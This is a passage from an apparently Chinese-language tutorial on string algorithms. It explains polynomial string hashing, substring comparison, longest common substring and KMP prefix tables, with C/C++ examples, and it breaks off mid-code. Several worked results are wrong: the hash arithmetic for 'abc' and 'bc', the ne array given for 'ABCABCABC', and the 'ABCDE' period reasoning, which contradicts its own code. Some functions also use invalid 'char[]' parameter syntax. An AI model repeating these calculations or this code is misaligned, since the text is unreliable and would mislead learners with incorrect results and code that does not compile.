str[2..3] 的哈希值：</span><br><span class="hljs-comment">h[3] = 93974 （字符串 &quot;abc&quot; 的哈希值）</span><br><span class="hljs-comment">h[1] = 97 （字符串 &quot;a&quot; 的哈希值）</span><br><span class="hljs-comment">子串 &quot;bc&quot; 的哈希值 get(2, 3) 就是：</span><br><span class="hljs-comment">get(2, 3) = h[3] - h[1] * p[3 - 2 + 1] = 93974 - 97 * p[2] = 93974 - 97 * 961</span><br><span class="hljs-comment">          = 93974 - 93377 = 597</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">const</span> ULL P = <span class="hljs-number">31</span>;<br>ULL h[N], p[N]; <span class="hljs-comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span><br><span class="hljs-comment">// 初始化str到数组中</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">string</span>&amp; str, <span class="hljs-type">int</span> n)</span> &#123;<br>    p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i - <span class="hljs-number">1</span>]; <span class="hljs-comment">// 计算字符串前i个字符的哈希值</span><br>        p[i] = p[i - <span class="hljs-number">1</span>] * P;              <span class="hljs-comment">// 计算P^i</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">// 计算子串 str[l ~ r] 的哈希值</span><br>ULL <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span>&#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="例题-11"><a href="#例题-11" class="headerlink" title="例题"></a>例题</h4><h4 id="判断两个子串是否相等"><a href="#判断两个子串是否相等" class="headerlink" title="判断两个子串是否相等"></a>判断两个子串是否相等</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//给定字符串 str = &quot;abcabc&quot;, 判断 str[1..3] 和 str[4..6] 是否相等。</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">const</span> ULL P = <span class="hljs-number">31</span>;<br>ULL h[N], p[N];  <span class="hljs-comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">string</span>&amp; str, <span class="hljs-type">int</span> n)</span> &#123;<br>    p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i - <span class="hljs-number">1</span>]; <span class="hljs-comment">// 计算字符串前i个字符的哈希值</span><br>        p[i] = p[i - <span class="hljs-number">1</span>] * P;              <span class="hljs-comment">// 计算P^i</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 计算子串 str[l..r] 的哈希值</span><br>ULL <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">areSubstringsEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> l1, <span class="hljs-type">int</span> r1, <span class="hljs-type">int</span> l2, <span class="hljs-type">int</span> r2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (r1 - l1 != r2 - l2) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 长度不一样就肯定不相等</span><br>    <span class="hljs-keyword">return</span> get(l1, r1) == get(l2, r2);    <span class="hljs-comment">// 比较哈希值</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;abcabc&quot;</span>;<br>    <span class="hljs-type">int</span> n = str.length();<br>    <span class="hljs-comment">// 初始化哈希数组</span><br>    init(str, n);<br>    <span class="hljs-comment">// 判断 str[1..3] 和 str[4..6] 是否相等</span><br>    <span class="hljs-keyword">if</span> (areSubstringsEqual(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>)) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Substrings are equal!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Substrings are not equal!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="最长公共子串"><a href="#最长公共子串" class="headerlink" title="最长公共子串"></a>最长公共子串</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">const</span> ULL P = <span class="hljs-number">31</span>;<br>ULL h1[N], h2[N], p1[N], p2[N];  <span class="hljs-comment">// h1, h2为str1和str2的哈希值，p1, p2为幂值</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">string</span>&amp; str, <span class="hljs-type">int</span> n, ULL h[], ULL p[])</span> &#123;<br>    p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i - <span class="hljs-number">1</span>];<br>        p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>    &#125;<br>&#125;<br><br>ULL <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, ULL h[], ULL p[])</span> &#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-built_in">string</span>&amp; str1, <span class="hljs-built_in">string</span>&amp; str2)</span> &#123;<br>    <span class="hljs-built_in">unordered_set</span>&lt;ULL&gt; hashes;<br>    <span class="hljs-type">int</span> n = str1.length(), m = str2.length();<br>    <span class="hljs-comment">// 计算str1所有长度为len的子串的哈希值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i + len - <span class="hljs-number">1</span> &lt;= n; i++) &#123;<br>        hashes.insert(get(i, i + len - <span class="hljs-number">1</span>, h1, p1));<br>    &#125;<br>    <span class="hljs-comment">// 查找str2中是否有长度为len的子串的哈希值与str1相同</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i + len - <span class="hljs-number">1</span> &lt;= m; i++) &#123;<br>        <span class="hljs-keyword">if</span> (hashes.count(get(i, i + len - <span class="hljs-number">1</span>, h2, p2))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> str1 = <span class="hljs-string">&quot;abcdef&quot;</span>;<br>    <span class="hljs-built_in">string</span> str2 = <span class="hljs-string">&quot;zcdemn&quot;</span>;<br>    <span class="hljs-type">int</span> n = str1.length(), m = str2.length();<br>    <span class="hljs-comment">// 初始化哈希数组</span><br>    init(str1, n, h1, p1);<br>    init(str2, m, h2, p2);<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = min(n, m);<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 二分法查找最长公共子串的长度</span><br>    <span class="hljs-keyword">while</span> (l &lt;= r) &#123;<br>        <span class="hljs-type">int</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (check(mid, str1, str2)) &#123;<br>            ans = mid;<br>            l = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            r = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Length of longest common substring: &quot;</span> &lt;&lt; ans &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kmp"><a href="#kmp" class="headerlink" title="kmp"></a>kmp</h3><p>ne 数组的定义</p><p><code>ne[i]</code> 表示字符串 <code>s[1..i]</code>（即从第 1 个字符到第 i 个字符）中，最长的相等的前缀和后缀的长度（前后缀的相等部分不包括 <code>s[i]</code> 本身）。</p><p>ne数组的计算过程</p><p>对于每个位置 <code>i</code>，我们需要查找 <code>s[1..i]</code> 的最长前后缀。具体计算方法如下：</p><ol><li>如果当前字符 <code>s[i]</code> 与之前的某个部分不匹配，我们需要查看 <code>ne</code> 数组的值来决定跳过多少个字符，以免进行重复比较。</li><li>如果当前字符 <code>s[i]</code> 与之前的某个部分匹配，那么就可以扩展前后缀。</li></ol><p>字符串：<code>ababcab</code></p><ol><li>初始化：<ul><li><code>s = &quot;ababcab&quot;</code>，长度为 7。</li><li><code>ne[0] = 0</code>，因为没有字符。</li></ul></li><li>计算 <code>ne</code> 数组：<ul><li><code>i = 1</code>，字符 <code>s[1] = &#39;a&#39;</code>：<ul><li>这里没有前缀和后缀，所以 <code>ne[1] = 0</code>。</li></ul></li><li><code>i = 2</code>，字符 <code>s[2] = &#39;b&#39;</code>：<ul><li><code>s[1] = &#39;a&#39;</code> 和 <code>s[2] = &#39;b&#39;</code> 不匹配，所以 <code>ne[2] = 0</code>。</li></ul></li><li><code>i = 3</code>，字符 <code>s[3] = &#39;a&#39;</code>：<ul><li><code>s[1] = &#39;a&#39;</code> 和 <code>s[3] = &#39;a&#39;</code> 匹配，所以 <code>ne[3] = 1</code>，表示前缀和后缀 <code>a</code> 匹配。</li></ul></li><li><code>i = 4</code>，字符 <code>s[4] = &#39;b&#39;</code>：<ul><li><code>s[2] = &#39;b&#39;</code> 和 <code>s[4] = &#39;b&#39;</code> 匹配，所以 <code>ne[4] = 2</code>，表示前缀和后缀 <code>ab</code> 匹配。</li></ul></li><li><code>i = 5</code>，字符 <code>s[5] = &#39;c&#39;</code>：<ul><li><code>s[3] = &#39;a&#39;</code> 和 <code>s[5] = &#39;c&#39;</code> 不匹配，回退到 <code>ne[3] = 1</code>，<code>s[1] = &#39;a&#39;</code> 和 <code>s[5] = &#39;c&#39;</code> 也不匹配，回退到 <code>ne[1] = 0</code>，<code>s[1] = &#39;a&#39;</code> 和 <code>s[5] = &#39;c&#39;</code> 不匹配，最终 <code>ne[5] = 0</code>。</li></ul></li><li><code>i = 6</code>，字符 <code>s[6] = &#39;a&#39;</code>：<ul><li><code>s[1] = &#39;a&#39;</code> 和 <code>s[6] = &#39;a&#39;</code> 匹配，所以 <code>ne[6] = 1</code>，表示前缀和后缀 <code>a</code> 匹配。</li></ul></li><li><code>i = 7</code>，字符 <code>s[7] = &#39;b&#39;</code>：<ul><li><code>s[2] = &#39;b&#39;</code> 和 <code>s[7] = &#39;b&#39;</code> 匹配，所以 <code>ne[7] = 2</code>，表示前缀和后缀 <code>ab</code> 匹配。</li></ul></li></ul></li></ol><p><code>ne</code> 数组的含义</p><ul><li><code>ne[1] = 0</code>，表示从 <code>s[1]</code> 没有任何前后缀匹配。</li><li><code>ne[2] = 0</code>，表示从 <code>s[1..2]</code> 没有任何前后缀匹配。</li><li><code>ne[3] = 1</code>，表示从 <code>s[1..3]</code> 有一个匹配的前后缀：<code>a</code>。</li><li><code>ne[4] = 2</code>，表示从 <code>s[1..4]</code> 有一个匹配的前后缀：<code>ab</code>。</li><li><code>ne[5] = 0</code>，表示从 <code>s[1..5]</code> 没有任何前后缀匹配。</li><li><code>ne[6] = 1</code>，表示从 <code>s[1..6]</code> 有一个匹配的前后缀：<code>a</code>。</li><li><code>ne[7] = 2</code>，表示从 <code>s[1..7]</code> 有一个匹配的前后缀：<code>ab</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> ne[N];  <span class="hljs-comment">// 部分匹配表</span><br><br><span class="hljs-comment">// 计算部分匹配表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">getNext</span><span class="hljs-params">(<span class="hljs-type">char</span>* p, <span class="hljs-type">int</span> m)</span> &#123;<br>    ne[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 初始化 ne[0]</span><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// j 代表当前匹配的字符位置</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];  <span class="hljs-comment">// 回退</span><br>        <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) j++;  <span class="hljs-comment">// 匹配成功，扩展</span><br>        ne[i] = j;  <span class="hljs-comment">// 记录部分匹配值</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// KMP 算法匹配函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">KMP</span><span class="hljs-params">(<span class="hljs-type">char</span>* s, <span class="hljs-type">char</span>* p)</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-built_in">strlen</span>(s), m = <span class="hljs-built_in">strlen</span>(p);<br>    getNext(p, m);  <span class="hljs-comment">// 计算部分匹配表</span><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 模式串匹配的位置</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;  <span class="hljs-comment">// 从 s[0] 开始遍历</span><br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; s[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];  <span class="hljs-comment">// 如果字符不匹配，回退</span><br>        <span class="hljs-keyword">if</span> (s[i] == p[j + <span class="hljs-number">1</span>]) j++;  <span class="hljs-comment">// 匹配成功，扩展</span><br>        <span class="hljs-keyword">if</span> (j == m - <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// 匹配成功</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Pattern found at position %d\n&quot;</span>, i - m + <span class="hljs-number">2</span>);  <span class="hljs-comment">// 输出位置（从1开始）</span><br>            j = ne[j];  <span class="hljs-comment">// 使用部分匹配表调整位置</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>], p[<span class="hljs-number">1000</span>];  <span class="hljs-comment">// 定义字符数组存储输入的字符串</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);  <span class="hljs-comment">// 输入主字符串</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, p);  <span class="hljs-comment">// 输入模式串</span><br>    KMP(s, p);  <span class="hljs-comment">// 调用 KMP 算法查找模式串</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="例题-12"><a href="#例题-12" class="headerlink" title="例题"></a>例题</h4><h4 id="找出字符串的周期"><a href="#找出字符串的周期" class="headerlink" title="找出字符串的周期"></a>找出字符串的周期</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*输入字符串：&quot;ABCABCABC&quot;</span><br><span class="hljs-comment">计算部分匹配表 ne：</span><br><span class="hljs-comment">ne = [-1, 0, 1, 2, 3, 4, 5, 6, 7]</span><br><span class="hljs-comment">最长前后缀长度：L = ne[8] = 6</span><br><span class="hljs-comment">计算周期：t = len - L = 9 - 6 = 3</span><br><span class="hljs-comment">判断：9 % 3 == 0，所以周期为 3，输出 &quot;The period of the string is: 3&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">输入字符串：&quot;ABCDE&quot;</span><br><span class="hljs-comment">计算部分匹配表 ne：</span><br><span class="hljs-comment">ne = [-1, 0, 0, 0, 0]</span><br><span class="hljs-comment">最长前后缀长度：L = ne[4] = 0</span><br><span class="hljs-comment">计算周期：t = len - L = 5 - 0 = 5</span><br><span class="hljs-comment">判断：5 % 5 == 0，所以字符串没有周期，输出 &quot;The string does not have a period.&quot;。*/</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> ne[N];  <span class="hljs-comment">// 部分匹配表</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getNext</span><span class="hljs-params">(<span class="hljs-type">char</span>[] p, <span class="hljs-type">int</span> m)</span> &#123;<br>    ne[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 比较p[i]和p[j+1]</span><br>            j = ne[j];<br>        &#125;<br>        <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) &#123;<br>            j++;<br>        &#125;<br>        ne[i] = j;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">KMP</span><span class="hljs-params">(<span class="hljs-type">char</span>[] s, <span class="hljs-type">int</span> n)</span> &#123;<br>    getNext(s, n);<br>    <span class="hljs-type">int</span> len = n;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The string is empty.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> L = ne[len - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>; <span class="hljs-comment">// 最长公共前后缀长度</span><br>    <span class="hljs-type">int</span> t = len - L;<br>    <span class="hljs-keyword">if</span> (t != <span class="hljs-number">0</span> &amp;&amp; len % t == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The period of the string is: %d\n&quot;</span>, t);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The string does not have a period.\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>    <span class="hljs-type">int</span> n = <span class="hljs-built_in">strlen</span>(s);<br>    KMP(s, n);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="字符串的最小周期问题"><a href="#字符串的最小周期问题" class="headerlink" title="字符串的最小周期问题"></a>字符串的最小周期问题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> ne[N];  <span class="hljs-comment">// 部分匹配表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">getNext</span><span class="hljs-params">(<span class="hljs-type">char</span>[] p, <span class="hljs-type">int</span> m)</span> &#123;<br>    ne[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) &#123;<br>            j = ne[j];  <span class="hljs-comment">// 回退</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) &#123;<br>            j++;<br>        &#125;<br>        ne[i] = j;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">findMinPeriod</span><span class="hljs-params">(<span class="hljs-type">char</span>[] s, <span class="hljs-type">int</span> n)</span> &#123;<br>    getNext(s, n);<br>    <span class="hljs-type">int</span> len = n;<br>    <span class="hljs-type">int</span> L = ne[len - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 最长公共前后缀的长度</span><br>    <span class="hljs-type">int</span> t = len - L;  <span class="hljs-comment">// 计算周期的长度</span><br><br>    <span class="hljs-keyword">if</span> (t != <span 